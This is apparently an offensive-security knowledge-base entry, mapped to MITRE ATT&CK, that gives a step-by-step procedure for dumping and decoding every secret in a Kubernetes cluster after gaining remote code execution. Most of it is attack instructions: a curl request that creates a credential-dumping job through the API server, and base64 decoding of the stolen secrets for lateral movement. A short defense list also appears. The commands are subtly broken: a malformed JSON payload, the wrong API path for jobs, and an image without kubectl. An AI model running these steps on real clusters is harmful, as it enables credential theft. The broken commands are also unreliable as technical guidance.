---
tags:
  - credential-access
  - kubernetes
  - secrets
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/kubectl-dump-secrets]]'
verified: false
platforms:
  - Kubernetes
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:32:48.632Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Credentials In Files]]'
id: dd0f97d8-8cde-4f8f-8df0-60bc0f77d0cb
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
---
# Extract-Internal-Credentials

## Summary

This procedure uses privileged access within the Kubernetes cluster to dump and exfiltrate stored credentials from secrets and configmaps, providing access to internal instances and services.

## Description

Post-RCE, attackers in the Snapchat breach extracted creds via jobs that query Kubernetes secrets API. This targets etcd-backed storage for tokens/keys granting SSH/RDP to instances. Prerequisites: Cluster-admin RCE; outcomes: Decoded credentials for lateral movement.

## Requirements

1. Active RCE session in cluster
2. Ability to create pods/jobs
3. Base64 decoding tools

## Defense

Defensive measures and detection strategies:

- Encrypt secrets at rest using Kubernetes secrets encryption
- Rotate credentials regularly and use external vaults (e.g., HashiCorp Vault)
- Monitor secret access logs and alert on bulk dumps

## Objectives

1. Retrieve sensitive credentials
2. Decode and validate them
3. Enable internal network access

## Instructions

### Step 1: Dump Secrets

**Context**: Create a job to list and output all secrets.

**Command** ([[commands/kubectl-dump-secrets]]):

```bash
curl -k -X POST https://<target-ip>:6443/api/v1/namespaces/default/jobs \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"batch/v1","kind":"Job","metadata":{"name":"cred-dump"},"spec":{"template":{"spec":{"containers":[{"name":"dump","image":"busybox","command":["sh","-c","kubectl get secrets --all-namespaces -o yaml > /tmp/secrets.yaml"]}],"restartPolicy":"Never"}},"backoffLimit":0}'}'
```

> Job runs; secrets dumped to file.

### Step 2: Exfiltrate and Decode

**Context**: Retrieve and decode the dump.

**Command** ([[commands/kubectl-dump-secrets]]):

```bash
echo '<base64-secret-data>' | base64 -d
```

> Reveals plaintext creds like API keys or passwords.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques

- [[Credentials In Files]] Credentials In Files

## Commands Used

- [[commands/kubectl-dump-secrets]]

## Tools Used

- None

## Tags

- [[credential-access]]
- [[kubernetes]]
- [[secrets]]
